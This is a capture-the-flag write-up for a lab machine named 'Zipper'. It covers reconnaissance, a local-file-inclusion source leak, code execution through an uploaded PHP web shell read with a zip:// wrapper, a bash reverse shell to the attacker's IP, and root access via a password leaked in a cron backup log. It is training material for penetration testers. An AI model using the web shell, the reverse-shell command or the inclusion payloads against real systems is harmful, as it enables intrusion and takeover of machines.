# CTF Writeup: Zipper

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.237.229
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 05:40 -0500
Nmap scan report for 192.168.237.229
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Zipper
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   27.35 ms 192.168.45.1
2   27.45 ms 192.168.45.254
3   27.48 ms 192.168.251.1
4   27.61 ms 192.168.237.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.74 seconds
```

Upon inspecting the webpage, it is running "Zipper". Which is an application which compresses files to an .zip archive. There seems to be an upload functionality & maybe even an potential LFI.

Let's first of all enumerate endpoints.

```
dirsearch -u http://192.168.237.229        
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Zipper/reports/http_192.168.237.229/_25-12-29_05-44-45.txt

Target: http://192.168.237.229/

[05:44:45] Starting:                                                                                                                          
[05:44:48] 403 -  280B  - /.ht_wsr.txt                                      
[05:44:48] 403 -  280B  - /.htaccess.bak1                                   
[05:44:48] 403 -  280B  - /.htaccess.orig                                   
[05:44:48] 403 -  280B  - /.htaccess.sample
[05:44:48] 403 -  280B  - /.htaccess.save                                   
[05:44:48] 403 -  280B  - /.htaccessBAK
[05:44:48] 403 -  280B  - /.htaccessOLD2
[05:44:48] 403 -  280B  - /.htaccess_sc
[05:44:48] 403 -  280B  - /.htaccess_extra
[05:44:48] 403 -  280B  - /.htaccessOLD
[05:44:48] 403 -  280B  - /.htaccess_orig
[05:44:48] 403 -  280B  - /.htm                                             
[05:44:48] 403 -  280B  - /.html                                            
[05:44:48] 403 -  280B  - /.htpasswd_test                                   
[05:44:48] 403 -  280B  - /.httr-oauth
[05:44:48] 403 -  280B  - /.htpasswds
[05:44:50] 403 -  280B  - /.php                                             
[05:45:16] 403 -  280B  - /server-status                                    
[05:45:16] 403 -  280B  - /server-status/                                   
[05:45:19] 200 -  145B  - /style                                            
[05:45:22] 200 -    0B  - /upload.php                                       
[05:45:22] 403 -  280B  - /uploads/                                         
[05:45:22] 301 -  320B  - /uploads  ->  http://192.168.237.229/uploads/     
                                                                             
Task Completed
```

There is an upload.php file which hints probably inhabits the filter measures. But we can't view the file, let's utilize php wrappers to potentially view it, since we got LFI.

```
curl http://192.168.237.229/index.php?file=php://filter/convert.base64-encode/resource=upload
PD9waHAKaWYgKCRfRklMRVMgJiYgJF9GSUxFU1snaW1nJ10pIHsKICAgIAogICAgaWYgKCFlbXB0eSgkX0ZJTEVTWydpbWcnXVsnbmFtZSddWzBdKSkgewogICAgICAgIAogICAgICAgICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOwogICAgICAgICR6aXBfbmFtZSA9IGdldGN3ZCgpIC4gIi91cGxvYWRzL3VwbG9hZF8iIC4gdGltZSgpIC4gIi56aXAiOwogICAgICAgIAogICAgICAgIC8vIENyZWF0ZSBhIHppcCB0YXJnZXQKICAgICAgICBpZiAoJHppcC0+b3BlbigkemlwX25hbWUsIFppcEFyY2hpdmU6OkNSRUFURSkgIT09IFRSVUUpIHsKICAgICAgICAgICAgJGVycm9yIC49ICJTb3JyeSBaSVAgY3JlYXRpb24gaXMgbm90IHdvcmtpbmcgY3VycmVudGx5Ljxici8+IjsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGltYWdlQ291bnQgPSBjb3VudCgkX0ZJTEVTWydpbWcnXVsnbmFtZSddKTsKICAgICAgICBmb3IoJGk9MDskaTwkaW1hZ2VDb3VudDskaSsrKSB7CiAgICAgICAgCiAgICAgICAgICAgIGlmICgkX0ZJTEVTWydpbWcnXVsndG1wX25hbWUnXVskaV0gPT0gJycpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRuZXduYW1lID0gZGF0ZSgnWW1kSGlzJywgdGltZSgpKSAuIG10X3JhbmQoKSAuICcudG1wJzsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIE1vdmluZyBmaWxlcyB0byB6aXAuCiAgICAgICAgICAgICR6aXAtPmFkZEZyb21TdHJpbmcoJF9GSUxFU1snaW1nJ11bJ25hbWUnXVskaV0sIGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbJ2ltZyddWyd0bXBfbmFtZSddWyRpXSkpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gbW92aW5nIGZpbGVzIHRvIHRoZSB0YXJnZXQgZm9sZGVyLgogICAgICAgICAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snaW1nJ11bJ3RtcF9uYW1lJ11bJGldLCAnLi91cGxvYWRzLycgLiAkbmV3bmFtZSk7CiAgICAgICAgfQogICAgICAgICR6aXAtPmNsb3NlKCk7CiAgICAgICAgCiAgICAgICAgLy8gQ3JlYXRlIEhUTUwgTGluayBvcHRpb24gdG8gZG93bmxvYWQgemlwCiAgICAgICAgJHN1Y2Nlc3MgPSBiYXNlbmFtZSgkemlwX25hbWUpOwogICAgfSBlbHNlIHsKICAgICAgICAkZXJyb3IgPSAnPHN0cm9uZz5FcnJvciEhIDwvc3Ryb25nPiBQbGVhc2Ugc2VsZWN0IGEgZmlsZS4nOwogICAgfQp9Cg==
```

It worked! Let's now decode the base64 string.

```
echo "PD9waHAKaWYgKCRfRklMRVMgJiYgJF9GSUxFU1snaW1nJ10pIHsKICAgIAogICAgaWYgKCFlbXB0eSgkX0ZJTEVTWydpbWcnXVsnbmFtZSddWzBdKSkgewogICAgICAgIAogICAgICAgICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOwogICAgICAgICR6aXBfbmFtZSA9IGdldGN3ZCgpIC4gIi91cGxvYWRzL3VwbG9hZF8iIC4gdGltZSgpIC4gIi56aXAiOwogICAgICAgIAogICAgICAgIC8vIENyZWF0ZSBhIHppcCB0YXJnZXQKICAgICAgICBpZiAoJHppcC0+b3BlbigkemlwX25hbWUsIFppcEFyY2hpdmU6OkNSRUFURSkgIT09IFRSVUUpIHsKICAgICAgICAgICAgJGVycm9yIC49ICJTb3JyeSBaSVAgY3JlYXRpb24gaXMgbm90IHdvcmtpbmcgY3VycmVudGx5Ljxici8+IjsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGltYWdlQ291bnQgPSBjb3VudCgkX0ZJTEVTWydpbWcnXVsnbmFtZSddKTsKICAgICAgICBmb3IoJGk9MDskaTwkaW1hZ2VDb3VudDskaSsrKSB7CiAgICAgICAgCiAgICAgICAgICAgIGlmICgkX0ZJTEVTWydpbWcnXVsndG1wX25hbWUnXVskaV0gPT0gJycpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRuZXduYW1lID0gZGF0ZSgnWW1kSGlzJywgdGltZSgpKSAuIG10X3JhbmQoKSAuICcudG1wJzsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIE1vdmluZyBmaWxlcyB0byB6aXAuCiAgICAgICAgICAgICR6aXAtPmFkZEZyb21TdHJpbmcoJF9GSUxFU1snaW1nJ11bJ25hbWUnXVskaV0sIGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbJ2ltZyddWyd0bXBfbmFtZSddWyRpXSkpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gbW92aW5nIGZpbGVzIHRvIHRoZSB0YXJnZXQgZm9sZGVyLgogICAgICAgICAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snaW1nJ11bJ3RtcF9uYW1lJ11bJGldLCAnLi91cGxvYWRzLycgLiAkbmV3bmFtZSk7CiAgICAgICAgfQogICAgICAgICR6aXAtPmNsb3NlKCk7CiAgICAgICAgCiAgICAgICAgLy8gQ3JlYXRlIEhUTUwgTGluayBvcHRpb24gdG8gZG93bmxvYWQgemlwCiAgICAgICAgJHN1Y2Nlc3MgPSBiYXNlbmFtZSgkemlwX25hbWUpOwogICAgfSBlbHNlIHsKICAgICAgICAkZXJyb3IgPSAnPHN0cm9uZz5FcnJvciEhIDwvc3Ryb25nPiBQbGVhc2Ugc2VsZWN0IGEgZmlsZS4nOwogICAgfQp9Cg==" | base64 -d
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
        
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}
```

The Source code reveals, that there is no real security filters and that the file get's stored inside the /uploads directory. But the initial webshell get's compressed to an .zip file. We can utilize zip wrappers in order to access, the webshell and perform command execution on the target server.

I uploaded my webshell.

```
cat shell.php                                                                                    
<?php system($_REQUEST["cmd"]); ?>
```

I also downloaded the .zip which got compressed, because we will need the correct file.zip for the zip wrapper.

Let's view the compressed .zip file with zip wrappers in the browser to execute commands:

```
http://192.168.237.229/index.php?file=zip://uploads/upload_1767008986.zip%23shell&cmd=whoami
```

it worked, we got command execution! Let's get RCE!

Started up my listener on port 80.

```
nc -lvnp 80
```

Executed the following command.

```
http://192.168.237.229/index.php?file=zip://uploads/upload_1767008986.zip%23shell&cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.164/80+0>%261'
```

Gained RCE as user "www-data".

```
nc -lvnp 80                                 
listening on [any] 80 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.237.229] 48546
bash: cannot set terminal process group (963): Inappropriate ioctl for device
bash: no job control in this shell
www-data@zipper:/var/www/html$
```

Retrieved local.txt in /var/www directory.

```
5e1460104108cf2f0dc360e384cc06a5
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Inspected /etc/crontab file.

```
www-data@zipper:/var/www/html$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/backup.sh
#
```

There seems to be an backup.sh script executed with root permissions.

```
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

The script creates an backup.zip file in /opt/backups with authentication of the root user from the /var/www/html/uploads directory and compresses all .zip files inside this directory to the backup.zip.

We can utilize symlinks to abuse 7zip. Navigating into /var/www/html/uploads came with an surprise, since the script hints at an /root/secret which is being used as an password of the "root" user, but already is simlinked to an "enox.zip" file. Since this creates an error in 7zip and all errors are getting displayed in an backup.log file, we will be able to view this .log file and view the password of the "root" user. We basically have to do nothing.
 
```
www-data@zipper:/var/www/html/uploads$ cat /opt/backups/backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 14623

Scanning the drive:
10 files, 12617 bytes (13 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 10


Files read from disk: 10
Archive size: 14623 bytes (15 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
----------------
Scan WARNINGS: 1

```

Logged into user "root". with root:WildCardsGoingWild

```
www-data@zipper:/var/www/html/uploads$ su root
Password: 
root@zipper:/var/www/html/uploads#
```

Retrieved proof.txt in /root directory.

```
7da52f00031c001f23e741bce571160a
```
